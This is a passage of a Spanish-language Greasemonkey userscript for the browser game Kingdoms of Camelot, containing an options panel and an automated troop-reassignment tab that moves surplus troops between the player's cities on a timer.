	  document.getElementById('ResetALL').addEventListener ('click', function(){
	  		var serverID = getServerId();
	  		RemoveList = (GM_listValues());
	  		for (i=0;i<RemoveList.length;i++){
	  			logit(RemoveList[i]);
	  			GM_deleteValue(RemoveList[i]);
	  		}
	  		ResetAll=true;
	  		reloadKOC();
	  },false);

	  document.getElementById('pbWatchEnable').addEventListener ('change', t.e_watchChanged, false);
      document.getElementById('pbWideOpt').addEventListener ('change', t.e_wideChanged, false);
      t.togOpt ('pballowWinMove', 'pbWinDrag', mainPop.setEnableDrag);
      t.togOpt ('pbTrackWinOpen', 'pbTrackOpen');
      t.togOpt ('pbHideOnGoto', 'hideOnGoto');
	  t.togOpt ('pbFairie', 'pbKillFairie', FairieKiller.setEnable);
      t.togOpt ('pbGoldEnable', 'pbGoldEnable', CollectGold.setEnable);
      t.changeOpt ('pbgoldLimit', 'pbGoldHappy');
	  t.togOpt ('pbFoodToggle', 'pbFoodAlert');
      t.changeOpt ('pbeverymins', 'pbEveryMins');
      t.togOpt ('pbEveryEnable', 'pbEveryEnable', RefreshEvery.setEnable);
      t.togOpt ('pbChatREnable', 'pbChatOnRight', WideScreen.setChatOnRight);
	  t.togOpt ('pbWMapEnable', 'pbWideMap', WideScreen.useWideMap);
	  t.togOpt ('pbEveryEnable', 'pbEveryEnable', RefreshEvery.setEnable);
	  t.togOpt ('HelReq', 'HelpRequest');
      t.togOpt ('DelReq', 'DeleteRequest');
      t.togOpt ('MapExtra', 'MapShowExtra');

    } catch (e) {
      div.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';
    }
  },

  hide : function (){
  },

  show : function (){
  },

  togOpt : function (checkboxId, optionName, callOnChange){
    var t = Tabs.Options;
    var checkbox = document.getElementById(checkboxId);
    if (Options[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Options[optionName] = this.checked;
      saveOptions();
      if (callOnChange)
        callOnChange (this.checked);
    }
  },

  changeOpt : function (valueId, optionName, callOnChange){
    var t = Tabs.Options;
    var e = document.getElementById(valueId);
    e.value = Options[optionName];
    e.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Options[optionName] = this.value;
      saveOptions();
      if (callOnChange)
        callOnChange (this.value);
    }
  },

  e_watchChanged : function (){
    GlobalOptions.pbWatchdog = document.getElementById('pbWatchEnable').checked;
    GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
  },

  e_wideChanged : function (){
    GlobalOptions.pbWideScreen = document.getElementById('pbWideOpt').checked;
    GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
  },

}


/****************************  Reassign Implementation  *******************************/
var troops = {1:'SupplyTroops',
			  2:'Militiaman',
			  3:'Scout',
			  4:'Pikeman',
			  5:'Swordsman',
			  6:'Archer',
			  7:'Cavalry',
			  8:'HeavyCavalry',
			  9:'SupplyWagon',
			  10:'Ballista',
			  11:'BatteringRam',
			  12:'Catapult'};
Tabs.Reassign = {
  tabOrder: 1,
  tabLabel: 'Reasignar',
  myDiv: null,
  timer: null,
  reassignState: [],
  lRE: [],
  reassignRoutes: [],
  rallypointlevel:null,
  count:0,
  check:false,

    init: function(div){
		var t = Tabs.Reassign;
        t.myDiv = div;
		t.reassignState = {
            running: false,
        };
        t.readReassignState();
		t.readReassignRoutes();
		t.e_reassignRoutes();

      var m = '<DIV id=pbReMainDivF class=pbStat>FUNCION AUTOMATICA DE REASIGNACION DE TROPAS</div><TABLE id=pbtraderfunctions width=100% height=0% class=pbTab><TR align="center">';
      if (t.reassignState.running == false) {
          m += '<TD><INPUT id=pbReassignState type=submit value="Reasinar = OFF"></td>';
      } else {
          m += '<TD><INPUT id=pbReassignState type=submit value="Reasignar = ON"></td>';
      }
      m += '<TD><INPUT id=pbReassShowRoutes type=submit value="Mostrar Rutas"></td>';
      m += '<TD><INPUT id=pbReassHelp type=submit value="Ayuda"></td>';
	  m += '</tr></table></div>';
      m += '<DIV id=pbReassignDivD class=pbStat>AGREGAR RUTA DE REASIGNACIÓN</div>';

      m += '<TABLE id=pbaddreasignroute width=95% height=0% class=pbTab><TR align="left">';
      m += '<TD width=20px>desde Ciudad:</td> <TD width=310px><DIV style="margin-bottom:10px;"><span id=ptassigncity></span></div></td></tr>';

      m += '<TR align="left">';
      m += '<TD width=20px>A la Ciudad:</td> <TD width=310px><DIV style="margin-bottom:10px;"><span id=ptassigncityTo></span></div></td>';

	    m += '<TR align="left">';
	    m += '<TD colspan=4>Tiempo entre reasignaciones: <INPUT id=pbreassigninterval type=text size=2 value="'+Options.reassigninterval+'"\> minutos</td></tr></table>';

      m += '<DIV style="margin-top:10px;margin-bottom:5px;">Número de tropas que desea mantener en una ciudad:</div>';
      m += '<TABLE id=pbaddreasignroute width=100% height=0% class=pbTab><TR align="center">';

      m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_1_50.jpg?6545"></td>';
      m += '<TD>Tropa Sumin.</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_2_50.jpg?6545"></td>'
      m += '<TD>Milicianos</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_3_50.jpg?6545"></td>'
      m += '<TD>Exploradores</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_4_50.jpg?6545"></td>'
      m += '<TD>Piqueros</td></tr>'
      m += '<TR><TD><INPUT id=pbSupplyTroops type=checkbox unchecked=true\>';
      m += '<INPUT id=pbtargetSupplyTroops disabled=true type=text size=10 maxlength=10 value="0"\></td>';
      m += '<TD><INPUT id=pbMilitiaman type=checkbox unchecked=true\>';
      m += '<INPUT id=pbtargetMilitiaman disabled=true type=text size=10 maxlength=10 value="0"\></td>';
      m += '<TD><INPUT id=pbScout type=checkbox unchecked=true\>';
      m += '<INPUT id=pbtargetScout disabled=true type=text size=10 maxlength=10 value="0"\></td>';
      m += '<TD><INPUT id=pbPikeman type=checkbox unchecked=true\>';
      m += '<INPUT id=pbtargetPikeman disabled=true type=text size=10 maxlength=10 value="0"\></td></tr>';

      m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_5_50.jpg?6545"></td>';
      m += '<TD>Espadachines</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_6_50.jpg?6545"></td>'
      m += '<TD>Arqueros</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_7_50.jpg?6545"></td>'
      m += '<TD>C. Ligera</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_8_50.jpg?6545"></td>'
      m += '<TD>C. Pesada</td></tr>'
      m += '<TR><TD><INPUT id=pbSwordsman type=checkbox unchecked=true\>';
      m += '<INPUT id=pbtargetSwordsman disabled=true type=text size=10 maxlength=10 value="0"\></td>';
      m += '<TD><INPUT id=pbArcher type=checkbox unchecked=true\>';
      m += '<INPUT id=pbtargetArcher disabled=true type=text size=10 maxlength=10 value="0"\></td>';
      m += '<TD><INPUT id=pbCavalry type=checkbox unchecked=true\>';
      m += '<INPUT id=pbtargetCavalry disabled=true type=text size=10 maxlength=10 value="0"\></td>';
      m += '<TD><INPUT id=pbHeavyCavalry type=checkbox unchecked=true\>';
      m += '<INPUT id=pbtargetHeavyCavalry disabled=true type=text size=10 maxlength=10 value="0"\></td></tr>';

      m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_9_50.jpg?6545"></td>';
      m += '<TD>Carreta S.</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_10_50.jpg?6545"></td>'
      m += '<TD>Ballistas</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_11_50.jpg?6545"></td>'
      m += '<TD>Arrietes</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_12_50.jpg?6545"></td>'
      m += '<TD>Catapultas</td></tr>'
      m += '<TR><TD><INPUT id=pbSupplyWagon type=checkbox unchecked=true\>';
      m += '<INPUT id=pbtargetSupplyWagon disabled=true type=text size=10 maxlength=10 value="0"\></td>';
      m += '<TD><INPUT id=pbBallista type=checkbox unchecked=true\>';
      m += '<INPUT id=pbtargetBallista disabled=true type=text size=10 maxlength=10 value="0"\></td>';
      m += '<TD><INPUT id=pbBatteringRam type=checkbox unchecked=true\>';
      m += '<INPUT id=pbtargetBatteringRam disabled=true type=text size=10 maxlength=10 value="0"\></td>';
      m += '<TD><INPUT id=pbCatapult type=checkbox unchecked=true\>';
      m += '<INPUT id=pbtargetCatapult disabled=true type=text size=10 maxlength=10 value="0"\></td></tr></table>';

      m += '<DIV style="text-align:center; margin-top:15px"><INPUT id=pbSaveRouteReassign type=submit value="Agregar Ruta"></div>';

      t.myDiv.innerHTML = m;

      t.tcp = new CdispCityPicker ('ptreassign', document.getElementById('ptassigncity'), true, null, 0);
	  t.tcpto = new CdispCityPicker ('ptreassignTo', document.getElementById('ptassigncityTo'), true);
	  for(var k in troops){
      document.getElementById('pbtarget'+troops[k]).value = parseInt(Seed.units['city' + t.tcp.city.id]['unt'+k]);
	  }

      document.getElementById('ptassigncity').addEventListener('click', function(){
	    for(var k in troops){
        document.getElementById('pbtarget'+troops[k]).value = parseInt(Seed.units['city' + t.tcp.city.id]['unt'+k]);
	    }
      }, false);
      document.getElementById('pbReassHelp').addEventListener('click', function(){t.pbReassHelp();} , false);
      document.getElementById('pbReassignState').addEventListener('click', function(){
      	t.toggleReassignState(this);
      }, false);
      document.getElementById('pbSaveRouteReassign').addEventListener('click', function(){
      t.addReassignRoute();
      }, false);
      document.getElementById('pbReassShowRoutes').addEventListener('click', function(){
      t.showReassignRoutes();
      }, false);

      document.getElementById('pbreassigninterval').addEventListener('keyup', function(){
		if (isNaN(document.getElementById('pbreassigninterval').value)){ document.getElementById('pbreassigninterval').value=0 ;}
		Options.reassigninterval = document.getElementById('pbreassigninterval').value;
		saveOptions();
      }, false);

      document.getElementById('pbtargetSupplyTroops').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetSupplyTroops').value)) document.getElementById('pbtargetSupplyTroops').value=0 ;
      }, false);
      document.getElementById('pbtargetMilitiaman').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetMilitiaman').value)) document.getElementById('pbtargetMilitiaman').value=0 ;
      }, false);
      document.getElementById('pbtargetScout').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetScout').value)) document.getElementById('pbtargetScout').value=0 ;
      }, false);
      document.getElementById('pbtargetPikeman').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetPikeman').value)) document.getElementById('pbtargetPikeman').value=0 ;
      }, false);
      document.getElementById('pbtargetSwordsman').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetSwordsman').value)) document.getElementById('pbtargetSwordsman').value=0 ;
      }, false);
      document.getElementById('pbtargetArcher').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetArcher').value)) document.getElementById('pbtargetArcher').value=0 ;
      }, false);
      document.getElementById('pbtargetCavalry').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetCavalry').value)) document.getElementById('pbtargetCavalry').value=0 ;
      }, false);
      document.getElementById('pbtargetHeavyCavalry').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetHeavyCavalry').value)) document.getElementById('pbtargetHeavyCavalry').value=0 ;
      }, false);
      document.getElementById('pbtargetSupplyWagon').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetSupplyWagon').value)) document.getElementById('pbtargetSupplyWagon').value=0 ;
      }, false);
      document.getElementById('pbtargetBallista').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetBallista').value)) document.getElementById('pbtargetBallista').value=0 ;
      }, false);
     document.getElementById('pbtargetBatteringRam').addEventListener('keyup', function(){
         if (isNaN(document.getElementById('pbtargetBatteringRam').value)) document.getElementById('pbtargetBatteringRam').value=0 ;
     }, false);
     document.getElementById('pbtargetCatapult').addEventListener('keyup', function(){
         if (isNaN(document.getElementById('pbtargetCatapult').value)) document.getElementById('pbtargetCatapult').value=0 ;
     }, false);


      document.getElementById('pbSupplyTroops').addEventListener('click', function(){
          if (document.getElementById('pbSupplyTroops').checked==false) {
              document.getElementById('pbtargetSupplyTroops').disabled = true;
          }
          else {
            document.getElementById('pbtargetSupplyTroops').disabled = false;
          }
      },false);
      document.getElementById('pbMilitiaman').addEventListener('click', function(){
          if (document.getElementById('pbMilitiaman').checked==false) {
              document.getElementById('pbtargetMilitiaman').disabled = true;
          }
          else {
            document.getElementById('pbtargetMilitiaman').disabled = false;
          }
      },false);
      document.getElementById('pbScout').addEventListener('click', function(){
          if (document.getElementById('pbScout').checked==false) {
              document.getElementById('pbtargetScout').disabled = true;
          }
          else {
            document.getElementById('pbtargetScout').disabled = false;
          }
      },false);
      document.getElementById('pbPikeman').addEventListener('click', function(){
          if (document.getElementById('pbPikeman').checked==false) {
              document.getElementById('pbtargetPikeman').disabled = true;
          }
          else {
            document.getElementById('pbtargetPikeman').disabled = false;
          }
      },false);
      document.getElementById('pbSwordsman').addEventListener('click', function(){
          if (document.getElementById('pbSwordsman').checked==false) {
              document.getElementById('pbtargetSwordsman').disabled = true;
          }
          else {
            document.getElementById('pbtargetSwordsman').disabled = false;
          }
      },false);
      document.getElementById('pbArcher').addEventListener('click', function(){
          if (document.getElementById('pbArcher').checked==false) {
              document.getElementById('pbtargetArcher').disabled = true;
          }
          else {
            document.getElementById('pbtargetArcher').disabled = false;
          }
      },false);
      document.getElementById('pbCavalry').addEventListener('click', function(){
          if (document.getElementById('pbCavalry').checked==false) {
              document.getElementById('pbtargetCavalry').disabled = true;
          }
          else {
            document.getElementById('pbtargetCavalry').disabled = false;
          }
      },false);
      document.getElementById('pbHeavyCavalry').addEventListener('click', function(){
          if (document.getElementById('pbHeavyCavalry').checked==false) {
              document.getElementById('pbtargetHeavyCavalry').disabled = true;
          }
          else {
            document.getElementById('pbtargetHeavyCavalry').disabled = false;
          }
      },false);
      document.getElementById('pbSupplyWagon').addEventListener('click', function(){
          if (document.getElementById('pbSupplyWagon').checked==false) {
              document.getElementById('pbtargetSupplyWagon').disabled = true;
          }
          else {
            document.getElementById('pbtargetSupplyWagon').disabled = false;
          }
      },false);
      document.getElementById('pbBallista').addEventListener('click', function(){
          if (document.getElementById('pbBallista').checked==false) {
              document.getElementById('pbtargetBallista').disabled = true;
          }
          else {
            document.getElementById('pbtargetBallista').disabled = false;
          }
      },false);
      document.getElementById('pbBatteringRam').addEventListener('click', function(){
          if (document.getElementById('pbBatteringRam').checked==false) {
              document.getElementById('pbtargetBatteringRam').disabled = true;
          }
          else {
            document.getElementById('pbtargetBatteringRam').disabled = false;
          }
      },false);
      document.getElementById('pbCatapult').addEventListener('click', function(){
          if (document.getElementById('pbCatapult').checked==false) {
              document.getElementById('pbtargetCatapult').disabled = true;
          }
          else {
            document.getElementById('pbtargetCatapult').disabled = false;
          }
      },false);


      window.addEventListener('unload', t.onUnload, false);
    },

    getRallypoint: function(cityId){
      var t = Tabs.Reassign;
      for (var o in Seed.buildings[cityId]){
		var buildingType = parseInt(Seed.buildings[cityId][o][0]);
		var buildingLevel = parseInt(Seed.buildings[cityId][o][1]);
		if (buildingType == 12) t.rallypointlevel=parseInt(buildingLevel);
    	  }
 },

 pbReassHelp : function (){
    var helpText = '<BR>Diseñado para reasignar tropas entre ciudades.<BR>';
    helpText += 'Marcas la ciudad desde donde partiran las tropas.<BR>';
    helpText += 'despues selecciona la ciudad a donde quieres reasignarlas!<BR>';
    helpText += 'Marca las casillas de las tropas que quieres reasignar.<BR>';
    helpText += 'Si no quieres dejar ninguna unidad de esa tropa , deja la cantidad a cero<BR>';
    helpText += 'pero si por el contrario quieres dejar tropas, especifica que cantidad<BR>';
    helpText += 'de tropas deseas dejar en la ciudad y solo se llevara las cantidades <BR>';
	helpText += 'que excedan de las que tu especificaste<BR>';
	helpText += 'Por ultimo pica el boton Agregar ruta y activas con el boton Reasignar';

    var pop = new CPopup ('pbReassHelp', 0, 0, 585, 230, true);
    pop.centerMe (mainPop.getMainDiv());
    pop.getMainDiv().innerHTML = helpText;
    pop.getTopDiv().innerHTML = '<CENTER><B>Ayuda Menu Power Bot: Reasignar tropas entre ciudades</b></center>';
    pop.show (true);
  },



 e_reassignRoutes: function(){
      var t = Tabs.Reassign;
      var now = new Date();
      if (t.reassignState.running == true)    {
      	var now = new Date().getTime()/1000.0;
      	now = now.toFixed(0);
      	var last = Options.lastreassign;
       		if ( now > (parseInt(last) + (Options.reassigninterval*60))){
    			  t.checkdoReassign();
      		}
      }
      setTimeout(function(){ t.e_reassignRoutes();}, Options.reassigninterval*1000);

    },

	delReassignRoutes: function() {

		var t = Tabs.Reassign;

		t.reassignRoutes= [];

	},
	checkcoords : function (obj){
		var t = Tabs.Reassign;
		if(obj.id == 'pbok'){
			t.check = true;
			t.addReassignRoute();
		}
		return;
	},
	addReassignRoute: function () {
		var t = Tabs.Reassign;
		var city = t.tcp.city.id;
		if(t.tcpto.city == null){
			new CdialogCancelContinue('<SPAN class=boldRed>No seleccionaste destino!</span>', null, null, mainPop.getMainDiv);
			return;
		}
		if(t.tcp.city.id == t.tcpto.city.id){
			new CdialogCancelContinue('<SPAN class=boldRed>No puedes reasignar a la ciudad misma!</span>', null, null, mainPop.getMainDiv);
			return;
		}
		if ((t.tcpto.city.x == 0 && t.tcpto.city.y == 0)&& !t.check)
		{
			new CdialogConfirm ('<SPAN class=boldRed>Estás a punto de establecer una ruta a la ubicación 0,0!</span>', t.checkcoords, unsafeWindow.modal_attack_check, mainPop.getMainDiv);
			return;
		}
		t.check = false;

		var SendSupplyTroop = document.getElementById('pbSupplyTroops').checked;
		var SendMilitiaman = document.getElementById('pbMilitiaman').checked;
		var SendScout = document.getElementById('pbScout').checked;
		var SendPikeman = document.getElementById('pbPikeman').checked;
		var SendSwordsman = document.getElementById('pbSwordsman').checked;
		var SendArchers = document.getElementById('pbArcher').checked;
		var SendCavalry = document.getElementById('pbCavalry').checked;
		var SendHeavyCavalry = document.getElementById('pbHeavyCavalry').checked;
		var SendSupplyWagons = document.getElementById('pbSupplyWagon').checked;
		var SendBallista = document.getElementById('pbBallista').checked;
		var SendBatteringRam = document.getElementById('pbBatteringRam').checked;
		var SendCatapult = document.getElementById('pbCatapult').checked;
		var SupplyTroop = document.getElementById('pbtargetSupplyTroops').value;
		var Militiaman = document.getElementById('pbtargetMilitiaman').value;
		var Scout = document.getElementById('pbtargetScout').value;
		var Pikeman = document.getElementById('pbtargetPikeman').value;
		var Swordsman = document.getElementById('pbtargetSwordsman').value;
		var Archers = document.getElementById('pbtargetArcher').value;
		var Cavalry = document.getElementById('pbtargetCavalry').value;
		var HeavyCavalry = document.getElementById('pbtargetHeavyCavalry').value;
		var SupplyWagons = document.getElementById('pbtargetSupplyWagon').value;
		var Ballista = document.getElementById('pbtargetBallista').value;
		var BatteringRam = document.getElementById('pbtargetBatteringRam').value;
		var Catapult = document.getElementById('pbtargetCatapult').value;
		var target_x = t.tcpto.city.x;
		var target_y = t.tcpto.city.y;

		var lRE = t.reassignRoutes;
			lRE.push({
				city:				city,
				target_x:			target_x,
				target_y:			target_y,
				SendSupplyTroop:	SendSupplyTroop,
				SupplyTroop:		SupplyTroop,
				SendMilitiaman:		SendMilitiaman,
				Militiaman:			Militiaman,
				SendScout:			SendScout,
				Scout:				Scout,
				SendPikeman: 		SendPikeman,
				Pikeman: 			Pikeman,
				SendSwordsman:		SendSwordsman,
				Swordsman:			Swordsman,
				SendArchers:		SendArchers,
				Archers:			Archers,
				SendCavalry: 		SendCavalry,
				Cavalry: 			Cavalry,
				SendHeavyCavalry:	SendHeavyCavalry,
				HeavyCavalry:		HeavyCavalry,
				SendSupplyWagons:	SendSupplyWagons,
				SupplyWagons:		SupplyWagons,
				SendBallista: 		SendBallista,
				Ballista: 			Ballista,
				SendBatteringRam:	SendBatteringRam,
				BatteringRam:		BatteringRam,
				SendCatapult:		SendCatapult,
				Catapult:			Catapult,
			});
		document.getElementById('pbReassignDivD').style.background ='#99FF99';
		setTimeout(function(){ (document.getElementById('pbReassignDivD').style.background =''); }, 1000);
	},
	showReassignRoutes: function () {
		var t = Tabs.Reassign;
		var popReassignRoutes = null;
		t.popReassignRoutes = new CPopup('pbShowTrade', 0, 0, 1200, 500, true, function() {clearTimeout (1000);});
		var m = '<DIV style="max-height:460px; height:460px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 width=100% class="pbShowReassignRoutes" id="pbRoutesQueue">';
		t.popReassignRoutes.getMainDiv().innerHTML = '</table></div>' + m;
		t.popReassignRoutes.getTopDiv().innerHTML = '<TD><B>Rutas de Reasignación:</td>';
		t.paintReassignRoutes();
		t._addTabHeader();
		t.popReassignRoutes.show(true)	;
	},
	paintReassignRoutes: function(){
	        var t = Tabs.Reassign;
	        var r = t.reassignRoutes;
	        var cityname;
			for (var i = (r.length-1); i>=0; i--) {
				for (var y=0; y< Seed.cities.length;y++) {
					if ( parseInt(Seed.cities[y][0]) == r[i].city) var cityname = Seed.cities[y][1];
				}
				var queueId = i;
				t._addTab(queueId,cityname, r[i].target_x, r[i].target_y, r[i].SendSupplyTroop,r[i].SupplyTroop, r[i].SendMilitiaman, r[i].Militiaman, r[i].SendScout, r[i].Scout, r[i].SendPikeman, r[i].Pikeman, r[i].SendSwordsman, r[i].Swordsman, r[i].SendArchers, r[i].Archers, r[i].SendCavalry, r[i].Cavalry, r[i].SendHeavyCavalry, r[i].HeavyCavalry, r[i].SendSupplyWagons, r[i].SupplyWagons, r[i].SendBallista, r[i].Ballista, r[i].SendBatteringRam, r[i].BatteringRam, r[i].SendCatapult, r[i].Catapult);
	        }
	    },

	 _addTab: function(queueId,cityname,target_x,target_y,SendSupplyTroop,SupplyTroop,SendMilitiaman,Militiaman,SendScout,Scout,SendPikeman,Pikeman,SendSwordsman,Swordsman,SendArchers,Archers,SendCavalry,Cavalry,SendHeavyCavalry,HeavyCavalry,SendSupplyWagons,SupplyWagons,SendBallista,Ballista,SendBatteringRam,BatteringRam,SendCatapult,Catapult){
	 	var t = Tabs.Reassign;
	     var row = document.getElementById('pbRoutesQueue').insertRow(0);
	     row.vAlign = 'top';
	     row.insertCell(0).innerHTML = queueId;
	     row.insertCell(1).innerHTML = cityname;
	     row.insertCell(2).innerHTML = target_x + ',' + target_y;
	     row.insertCell(3).innerHTML = SendSupplyTroop;
	     row.insertCell(4).innerHTML = addCommasWhole1(SupplyTroop);
	     row.insertCell(5).innerHTML = SendMilitiaman;
	     row.insertCell(6).innerHTML = addCommasWhole1(Militiaman);
	 	 row.insertCell(7).innerHTML = SendScout;
	 	 row.insertCell(8).innerHTML = addCommasWhole1(Scout);
	 	 row.insertCell(9).innerHTML = SendPikeman;
	 	 row.insertCell(10).innerHTML = addCommasWhole1(Pikeman);
	 	 row.insertCell(11).innerHTML = SendSwordsman;
	 	 row.insertCell(12).innerHTML = addCommasWhole1(Swordsman);
	 	 row.insertCell(13).innerHTML = SendArchers;
	 	 row.insertCell(14).innerHTML = addCommasWhole1(Archers);
	 	 row.insertCell(15).innerHTML = SendCavalry;
	 	 row.insertCell(16).innerHTML = addCommasWhole1(Cavalry);
	 	 row.insertCell(17).innerHTML = SendHeavyCavalry;
	 	 row.insertCell(18).innerHTML = addCommasWhole1(HeavyCavalry);
	 	 row.insertCell(19).innerHTML = SendSupplyWagons;
	 	 row.insertCell(20).innerHTML = addCommasWhole1(SupplyWagons);
	 	 row.insertCell(21).innerHTML = SendBallista;
	 	 row.insertCell(22).innerHTML = addCommasWhole1(Ballista);
	 	 row.insertCell(23).innerHTML = SendBatteringRam;
	 	 row.insertCell(24).innerHTML = addCommasWhole1(BatteringRam);
	 	 row.insertCell(25).innerHTML = SendCatapult;
	 	 row.insertCell(26).innerHTML = addCommasWhole1(Catapult);
	     row.insertCell(27).innerHTML = '<a class="button20" id="tradecancel_' + queueId + '"><span>Borrar</span></a>';
	     document.getElementById('tradecancel_' + queueId).addEventListener('click', function(){
	        t.cancelQueueElement(queueId);
	     }, false);
	 },

	 _addTabHeader: function() {
	 var t = Tabs.transport;
	     var row = document.getElementById('pbRoutesQueue').insertRow(0);
	     row.vAlign = 'top';
	     row.insertCell(0).innerHTML = "ID";
	     row.insertCell(1).innerHTML = "Desde";
	     row.insertCell(2).innerHTML = "a";
	     row.insertCell(3).innerHTML = "T. Sumin.";
	     row.insertCell(4).innerHTML = "";
	     row.insertCell(5).innerHTML = "Milicianos";
	     row.insertCell(6).innerHTML = "";
	 	 row.insertCell(7).innerHTML = "Esploradores";
	     row.insertCell(8).innerHTML = "";
	     row.insertCell(9).innerHTML = "Piqueros";
	     row.insertCell(10).innerHTML = "";
	     row.insertCell(11).innerHTML = "Espadachines";
	     row.insertCell(12).innerHTML = "";
	     row.insertCell(13).innerHTML = "Arqueros";
	     row.insertCell(14).innerHTML = "";
	     row.insertCell(15).innerHTML = "Caballeria L.";
	     row.insertCell(16).innerHTML = "";
	     row.insertCell(17).innerHTML = "Caballeria P.";
	     row.insertCell(18).innerHTML = "";
	     row.insertCell(19).innerHTML = "Carretas";
	     row.insertCell(20).innerHTML = "";
	     row.insertCell(21).innerHTML = "Ballistas";
	     row.insertCell(22).innerHTML = "";
	     row.insertCell(23).innerHTML = "Arrietes";
	     row.insertCell(24).innerHTML = "";
	     row.insertCell(25).innerHTML = "Catapultas";
	     row.insertCell(26).innerHTML = "";
	     row.insertCell(27).innerHTML = "Borrar";
	   },

	 cancelQueueElement: function(queueId){
	     var t = Tabs.Reassign;
	     var queueId = parseInt(queueId);
	     t.reassignRoutes.splice(queueId, 1);
	     t.showReassignRoutes();
	 },

	saveReassignRoutes: function(){
		var t = Tabs.Reassign;
        var serverID = getServerId();
        GM_setValue('reassignRoutes_' + serverID, JSON2.stringify(t.reassignRoutes));
    },
    readReassignRoutes: function(){
        var t = Tabs.Reassign;
        var serverID = getServerId();
        s = GM_getValue('reassignRoutes_' + serverID);
        if (s != null) {
            route = JSON2.parse(s);
            for (k in route)
                t.reassignRoutes[k] = route[k];
        }
    },
	saveReassignState: function(){
		var t = Tabs.Reassign;
        var serverID = getServerId();
        GM_setValue('reassignState_' + serverID, JSON2.stringify(t.reassignState));
    },
    readReassignState: function(){
        var t = Tabs.Reassign;
        var serverID = getServerId();
        s = GM_getValue('reassignState_' + serverID);
        if (s != null) {
            state = JSON2.parse(s);
            for (k in state)
                t.reassignState[k] = state[k];
        }
    },
    toggleReassignState: function(obj){
		var t = Tabs.Reassign;
        if (t.reassignState.running == true) {
            t.reassignState.running = false;
            obj.value = "Reassign = OFF";
			t.checkdoreassigntimeout = null;
			t.count = 0;
        }
        else {
            t.reassignState.running = true;
            obj.value = "Reassign = ON";
			t.e_reassignRoutes();
        }
    },

	checkdoReassign: function(){
	var t = Tabs.Reassign;
	t.doReassign(t.count);
	t.count++;
		if(t.count < t.reassignRoutes.length && t.reassignState.running){
		  t.checkdoreassigntimeout = setTimeout(function() { t.checkdoReassign();}, 5000);
		} else {
		  var now = new Date().getTime()/1000.0;
		  now = now.toFixed(0);
		  Options.lastreassign = now;
		  saveOptions();
		  t.count = 0;
		}
	},

    doReassign: function(count){
    	var t = Tabs.Reassign;
   		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
   		if(t.reassignRoutes.length==0) return;
   		var send=[];
   		var citytotal=0;
   		var totalsend=0;
		params.u1 = 0;
		params.u2 = 0;
		params.u3 = 0;
		params.u4 = 0;
		params.u5 = 0;
		params.u6 = 0;
		params.u7 = 0;
		params.u8 = 0;
		params.u9 = 0;
		params.u10 = 0;
		params.u11 = 0;
		params.u12 = 0;

   	 	var city = t.reassignRoutes[count]["city"];
   	 	var xcoord = t.reassignRoutes[count]["target_x"];
   	 	var ycoord = t.reassignRoutes[count]["target_y"];

    	var cityID = 'city' + city;
		var marching = getMarchInfo(cityID);
    	t.getRallypoint(cityID);
		if(t.rallypointlevel == 11) t.rallypointlevel = 15;
    	var maxsend = (t.rallypointlevel * 10000);
    	totalsend=0;

    	var troopsselect=["SupplyTroop","Militiaman","Scout","Pikeman","Swordsman","Archers","Cavalry","HeavyCavalry","SupplyWagons","Ballista","BatteringRam","Catapult"];
    	for (k=0; k<troopsselect.length; k++) {
    		var citytroops = Seed.units[cityID]['unt'+(parseInt(k)+1)];
			var marchtroops = marching.marchUnits[parseInt(k)+1];
			citytotal = parseInt(citytroops) + parseInt(marchtroops);
			//alert(citytotal + ' > ' + t.reassignRoutes[count][troopsselect[k]] + ' - ' + totalsend + ' <= ' + maxsend + ' - ' + t.reassignRoutes[count]['Send'+troopsselect[k]]);
			//if(k== 5) GM_log(citytotal +'  ' + t.reassignRoutes[count][troopsselect[k]]);
			if(t.reassignRoutes[count]['Send'+troopsselect[k]]==false) {continue; }
			if(citytotal > t.reassignRoutes[count][troopsselect[k]]){
				var sendtroops = parseInt(citytotal) - parseInt(t.reassignRoutes[count][troopsselect[k]]);
				if (parseInt(sendtroops) > parseInt(citytroops)) sendtroops = citytroops;
				if (parseInt(sendtroops) < 0) sendtroops = 0;
				send[(parseInt(k)+1)] = sendtroops;
				totalsend += send[(parseInt(k)+1)];
